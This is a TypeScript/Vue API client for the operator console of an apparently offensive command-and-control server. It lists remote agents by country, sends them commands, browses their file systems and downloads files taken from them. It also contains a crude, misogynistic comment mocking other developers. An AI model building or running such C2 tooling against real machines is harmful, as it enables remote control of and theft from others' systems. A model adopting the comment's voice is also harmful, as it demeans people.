import * as jose from 'jose'
import { ref } from 'vue'

export type JWTPayload = {
    u: string // Operator's username.
}

export type Agent = {
    id: string
    hostname: string
    os: string
    ip: string
    ram: string
    osVersion: string
    cpuName: string
    arch: string
    lastSeen: number
}

export type Operator = {
    username: string
    publicKeyHex: string
    createdAt: bigint
}

export type Message = {
    id: string
    agentId: string
    request: string
    response: string
    createdAt: bigint
}

export type Country = {
    i: string // ISO code
    n: string // Country Name
}

export type StatsAgents = {
    unknownOriginCount: number
}

export type Permission = {
    id: string        
    key: number 
    username: string        
    metadata: string        
    createdAt: bigint         
}

export type GetPermissionsRespCtx = Record<PERMISSIONS, Permission>

export enum PERMISSIONS {
    PERMISSION_NOT_SPECIFIED,
    PERMISSION_AGENTS_LIST,
    PERMISSION_AGENTS_STATS,
    PERMISSION_AGENTS_LIST_MESSAGES,
    PERMISSION_AGENTS_INSERT_MESSAGE,
    PERMISSION_CHAT_LIST_CHANNELS,
    PERMISSION_CHAT_LIST_CHANNEL_MESSAGES,
    PERMISSION_CHAT_INSERT_CHANNEL,
    PERMISSION_CHAT_INSERT_CHANNEL_MESSAGE,
    PERMISSION_CHAT_DELETE_CHANNEL,
    PERMISSION_CHAT_DELETE_CHANNEL_MESSAGE,
    PERMISSION_OPERATORS_LIST,
    PERMISSION_OPERATORS_INSERT,
    PERMISSION_OPERATORS_DELETE,
    PERMISSION_INSERT,
    PERMISSION_DELETE,
    PERMISSION_LIST,
    PERMISSION_FILES_UPLOADS_REPO_LIST,
    PERMISSION_FILES_REMOTE_REPO_LIST,
    PERMISSION_FILES_DOWNLOADS_REPO_LIST,
    PERMISSION_FILES_UPLOAD_TO_DOWNLOADS_REPO,
}

export type FileRecord = {
    name: string
    isDir: boolean
    timestamp: bigint
}

export type RemoteFS = {
    id: string
    latestRequestedId: string
    currentDir: string
    content: FileRecord[]
}

export const API = ref(new class {
    public username: string
    public c2HostURL: string
    
    private privateKey: CryptoKey | null
    public store
    
    constructor() {
        this.username = ''
        this.c2HostURL = 'http://localhost:8080'
        this.privateKey = null

        // For all of you Vue and Rect 'bros'... Allow me to explain something to you..
        // No need to compliate stuff with boilerplate store implementation and over the top libraries,
        // the same way there is no need to setup a PostgreSQL instance for your shitty
        // app that only 5 people use concurrently.
        //
        // This is simple, this works, it's understandable.
        // And for all soydevs asking 'but what are you gonna do when you have use-case xyzzz'..
        // Am gonna change the implementation, that's what am gonna do.
        // Overthinking scenarios that did not happen is equivalent of overly-complex systems
        // which accommodates for 100 use-cases, however, operationally 3 are used.
        // And while you were overthinking all the scenarios, she is banging the guy who doesn't
        // know the Alphabet. A metaphor for a startup which just went live,
        // instead of masturbating to their technical implementation.
        this.store = ref({
            operators: {
                data: [] as Operator[],
                page: 0,
            },
            agents: {
                data: [] as Agent[],
                page: 0,
            },
            origins: {
                data: [] as Country[],
                selected: [] as string[], // ISO Country Codes.
            },
            stats: {
                unknownOriginCount: 0,
                countryCodes: [] as string[],
            },
            fileRepo: {
                downloads: [] as FileRecord[],
                uploads: [] as FileRecord[],
                remote: { id: '', latestRequestedId: '', currentDir: '', content: [] } as RemoteFS,
                agentId: '',
                loadingDownloads: false,
                loadingUploads: false,
                loadingRemote: false,
            },
            messages: {
                newMessageCallback: () => {},
                data: [] as Message[],
                agentId: '',
                lastSentAt: 0,
                page: undefined as number | undefined,
                before: undefined as string | undefined,
                after: undefined as string | undefined,
            },
        })

        this.initializePeriodicDataFetching()
    }

    public generalUpdate = async () => {
        if (this.privateKey === null || this.c2HostURL.length === 0 || this.username.length === 0) {
            return
        }

        this.store.value.agents.data = await this.fetchAgents(this.store.value.agents.page)
        this.store.value.operators.data = await this.fetchOperators(this.store.value.operators.page)

        if (this.store.value.origins.data.length === 0) {
            this.store.value.origins.data = await this.fetchOrigins()
        }

        const statsAgents = await this.fetchStatsAgents()
        this.store.value.stats.unknownOriginCount = statsAgents.unknownOriginCount

        this.store.value.stats.countryCodes = await this.fetchStatsCountries()

        if (this.store.value.fileRepo.agentId.length !== 0) {
            this.store.value.fileRepo.uploads = await this.fetchUploadsRepo(this.store.value.fileRepo.agentId)
            this.store.value.fileRepo.remote = await this.fetchRemoteFS(this.store.value.fileRepo.agentId)
            if (
                (this.store.value.fileRepo.remote.id !== '' && this.store.value.fileRepo.remote.latestRequestedId !== '')
                && (this.store.value.fileRepo.remote.id === this.store.value.fileRepo.remote.latestRequestedId)
            ) {
                this.store.value.fileRepo.loadingRemote = false
            }
        }
        this.store.value.fileRepo.downloads = await this.fetchDownloadsRepo()
    }

    private initializePeriodicDataFetching = async () => {
        await this.generalUpdate()

        setInterval(async () => {
            await this.generalUpdate()
        }, 3000)
    }

    public clearMessages = () => {
        this.store.value.messages = {
            newMessageCallback: () => {},
            lastSentAt: 0,
            agentId: '',
            data: [],
            page: undefined,
            before: undefined,
            after: undefined,
        }
    }

    public setPrivateKey = async (pemEncodedPrivateKey: string) => {
        // Converting from older PKCS#1 to PKCSS#8 header.
        pemEncodedPrivateKey = pemEncodedPrivateKey.replaceAll('-----BEGIN RSA PRIVATE KEY-----', '-----BEGIN PRIVATE KEY-----')
        pemEncodedPrivateKey = pemEncodedPrivateKey.replaceAll('-----END RSA PRIVATE KEY-----', '-----END PRIVATE KEY-----')

        this.privateKey = await jose.importPKCS8(pemEncodedPrivateKey, 'RS512')
    } 

    public sign = async (data: any) => {
        if (this.privateKey === null) {
            throw Error('private signing key is null')
        }
        const jwt = await new jose.SignJWT(data)
            .setProtectedHeader({ alg: 'RS512' })
            .setExpirationTime('3min')
            .setNotBefore(0)
            .sign(this.privateKey)
        return jwt
    }

    public verify = async (verificationKey: string, token: string) => {
        const publicKey = await jose.importSPKI(verificationKey, 'RS512')
        const { payload } = await jose.jwtVerify(token, publicKey, {
            algorithms: ['RS512']
        })
        return payload
    }

    public sendMessage = async (agentId: string, content: string) => {
        if (content.length === 0) {
            console.warn('cannot send a message with no content')
            return
        }
        const body: Partial<Message> = {
            agentId,
            request: content,
        }

        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/messages`, {
            method: 'PUT',
            headers: {
                Authorization: token,
            },
            body: JSON.stringify(body),
        })

        if (response.status !== 201) {
            throw Error(`unexpected status code: ${response.statusText}`)
        }

        this.store.value.messages.lastSentAt = Date.now()
    }

    public fetchMessagesByIds = async (messageIds: string[]) => {
        if (messageIds.length === 0) {
            return {}
        }

        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)

        const response = await fetch(`${this.c2HostURL}/v1/messages/by-ids`, {
            method: 'POST',
            headers: {
                Authorization: token,
            },
            body: JSON.stringify(messageIds),
        })

        if (response.status === 204) {
            return {}
        }

        return await response.json() as Record<string, Message>
    }

    public fetchMessages = async (agentId: string, options: { page: number | undefined, before: string | undefined, after: string | undefined }) => {
        if (agentId.length === 0) {
            return { before: '', after: '', messages: [] }
        }
        
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)

        const queryParams = [
            typeof options.page !== undefined ? `page=${options.page}` : '',
            typeof options.before !== undefined ? `before=${options.before}` : '',
            typeof options.after !== undefined ? `after=${options.after}` : '',
        ]

        const response = await fetch(`${this.c2HostURL}/v1/messages/${agentId}?${queryParams.join('&')}`, {
            headers: {
                Authorization: token,
            }
        })

        if (response.status === 204) {
            return { before: '', after: '', messages: [] }
        }

        const r = await response.json() as { before: string, after: string, messages: Message[] } 
        
        return { ...r, messages: r.messages.reverse() }
    }

    private fetchAgents = async (page: number) => {
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const origins = this.store.value.origins.selected.length === 0
            ? ''
            : `&origins=${this.store.value.origins.selected.join(',')}`

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/agents?page=${page}${origins}`, {
            headers: {
                Authorization: token,
            }
        })

        if (response.status === 204) {
            return []
        }

        return await response.json() as Agent[]
    }

    private fetchOperators = async (page: number) => {
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/operators?page=${page}`, {
            headers: {
                Authorization: token,
            }
        })

        if (response.status === 204) {
            return []
        }

        return await response.json() as Operator[]
    }

    private fetchOrigins = async () => {
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/geoip/origins`, {
            headers: {
                Authorization: token,
            }
        })

        if (response.status === 204) {
            return []
        }

        return await response.json() as Country[]
    }

    private fetchStatsAgents = async () => {
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/stats/agents`, {
            headers: {
                Authorization: token,
            }
        })

        return await response.json() as StatsAgents
    }

    private fetchStatsCountries = async () => {
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/stats/countries`, {
            headers: {
                Authorization: token,
            }
        })

        if (response.status === 204) {
            return []
        }

        return await response.json() as string[]
    }

    public fetchPermissions = async (operatorUsername: string) => {
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/permissions/${operatorUsername}`, {
            headers: {
                Authorization: token,
            }
        })

        if (response.status === 204) {
            return {} as GetPermissionsRespCtx
        }

        return await response.json() as GetPermissionsRespCtx
    }

    public fetchUploadsRepo = async (agentId: string) => {
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/files/repositories/uploads/${agentId}`, {
            headers: {
                Authorization: token,
            }
        })

        if (response.status === 204) {
            return []
        }

        return await response.json() as FileRecord[]
    }

    public fetchDownloadsRepo = async () => {
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/files/repositories/downloads`, {
            headers: {
                Authorization: token,
            }
        })

        if (response.status === 204) {
            return []
        }

        return await response.json() as FileRecord[]
    }

    public fetchRemoteFS = async (agentId: string) => {
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/files/repositories/remote/${agentId}`, {
            headers: {
                Authorization: token,
            }
        })

        if (response.status === 204) {
            return { id: '', latestRequestedId: '', currentDir: '', content: [] } as RemoteFS
        }

        return await response.json() as RemoteFS
    }

    public downloadFileFromUploadsRepo = async (fileName: string) => {
        const tokenPayload: JWTPayload = {
            u: this.username,
        }

        const token = await this.sign(tokenPayload)
        const response = await fetch(`${this.c2HostURL}/v1/files/download/${fileName}`, {
            headers: {
                Authorization: token,
            },
        })

        const blob = await response.blob()
        
        // Create a temporary URL for the blob
        const url = window.URL.createObjectURL(blob)
        
        // Create a temporary link element
        const link = document.createElement('a')
        link.href = url
        link.download = fileName // Set the file name for the download
        
        // Append the link to the DOM, trigger click, and remove it
        document.body.appendChild(link)
        link.click()
        document.body.removeChild(link)
        
        // Revoke the object URL to free up memory
        window.URL.revokeObjectURL(url)
    }
}())

export const formatUnixNanoTime = (nanoStr: string | bigint | number) => {
    const nano = BigInt(nanoStr);
    const milli = Number(nano / 1000000n);
    const date = new Date(milli);
    const now = new Date();
    // @ts-ignore
    const diff = now - date;  // difference in milliseconds
    const diffSeconds = Math.floor(diff / 1000);

    if (diffSeconds < 60) {
        return `${diffSeconds}s ago`;
    } else if (diffSeconds < 3600) {
        const minutes = Math.floor(diffSeconds / 60);
        return `${minutes}min ago`;
    } else if (diffSeconds < 86400) {
        const hours = Math.floor(diffSeconds / 3600);
        const minutes = Math.floor((diffSeconds % 3600) / 60);
        return `${hours}h ${minutes}min ago`;
    } else {
        const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
        const day = date.getDate();
        const month = months[date.getMonth()];
        const year = date.getFullYear();
        const hours = date.getHours().toString().padStart(2, '0');
        const minutes = date.getMinutes().toString().padStart(2, '0');
        return `${day} ${month} ${year} / ${hours}:${minutes}`;
    }
}